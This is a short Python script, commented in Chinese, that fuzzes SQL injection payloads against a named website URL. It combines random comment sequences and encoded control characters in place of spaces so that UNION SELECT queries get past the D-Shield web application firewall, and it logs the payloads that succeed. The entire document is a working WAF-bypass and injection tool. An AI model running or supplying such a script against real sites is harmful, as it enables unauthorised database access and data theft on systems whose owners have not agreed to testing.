# 过D盾判断是否存在注入，因为D盾肯定过滤了union或者select，所以不知道该怎么跑注入。
# 不过用  (fuzz的字符)and(fuzz的字符)1 这种payload去fuzz可以替换空格的bypass字符串从而绕过D盾
import requests
import random
import time

fuzz_zs = ['/*','*/','/*!','/**/','?','/','*','=','`','!','%','.','-','+']
fuzz_sz = ['']
fuzz_ch = ['%0a','%0b','%0c','%0d','%0e','%0f','%0g','%0h','%0i','%0j']

fuzz = fuzz_zs + fuzz_sz + fuzz_ch
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}
target = 'http://lrzdjx.com/sqltest.php?x=1'
nums = len(fuzz) ** 5
num = 0

if __name__ == '__main__':
    for i in range(1000000):
        a = random.choice(fuzz)
        b = random.choice(fuzz)
        c = random.choice(fuzz)
        d = random.choice(fuzz)
        e = random.choice(fuzz)
        num += 1
        #payload = "/*!union" + a + b + c + d + e + "select*/ 1,2,3"
        ret = a + b + c + d + e
        #payload = "/*!union" + ret + "select*/ 1,2,3"
        #url = target + payload

        # 寻找替换空格
        url = 'http://lrzdjx.com/sqltest.php?x=1|@a:=(select /*{}*/3)union(select 11111111111,2,@a)'.format(ret)
        print('[{}] {}'.format(num, url))
        try:
            res = requests.get(url)
            if '11111111111' in res.text:
                with open('ret1.txt', 'at', encoding='utf-8') as f:
                    print('11111111111')
                    f.writelines(url + '\n')
        except Exception as e:
            print(e)
            time.sleep(5)


